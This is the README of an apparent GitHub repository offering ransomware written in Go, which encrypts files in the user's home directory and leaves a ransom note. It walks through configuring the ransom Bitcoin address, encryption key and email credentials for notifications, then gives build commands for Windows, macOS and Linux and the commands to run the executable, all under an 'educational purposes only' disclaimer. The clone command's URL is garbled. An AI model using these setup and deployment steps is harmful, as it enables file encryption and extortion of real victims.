# ransomware-encryptor-go
# Ransomware Encryptor (Go)

This repository contains a simple ransomware encryptor written in Go. The code encrypts files in the user's home directory and generates a ransom note on the desktop, providing information on how to decrypt the files.

## Usage

**Warning: This code is for educational purposes only. Creating and deploying ransomware is illegal and unethical. Use this code responsibly and at your own risk.**

1. Clone the repository:

   ```bash
   git clone [https://github.com/praiseordu/ransomware-encryptor-go](https://github.com/praiseordu/ransomware-encryptor-go)https://github.com/praiseordu/ransomware-encryptor-go.git
   cd ransomware-encryptor-go
Set your configuration in the main.go file:

    keyString: The encryption key.
    salt: Random value for increased security.
    emailServer, emailPort, senderEmail, senderPassword, recipientEmail: Email configuration for notifications.
    bitcoinAddress: Bitcoin address for the ransom payment.
    ransomNoteFile: Filename of the ransom note.

 Build the executable for your platform:

    Windows:

env GOOS=windows GOARCH=amd64 go build -o ransomware-encryptor.exe main.go

macOS:

env GOOS=darwin GOARCH=amd64 go build -o ransomware-encryptor main.go

Linux:

    env GOOS=linux GOARCH=amd64 go build -o ransomware-encryptor main.go

Run the executable:

    Windows:

./ransomware-encryptor.exe

macOS/Linux:

./ransomware-encryptor
Disclaimer

This code is provided for educational purposes only. The use of ransomware is illegal and unethical. The author and contributors are not responsible for any misuse of this code.

Contributing

If you would like to contribute to this project, please follow the Contributing Guidelines.

Contact

For inquiries or concerns, please contact Your Cyber_Praise @ cybersectechsolutions@gmail.com
    
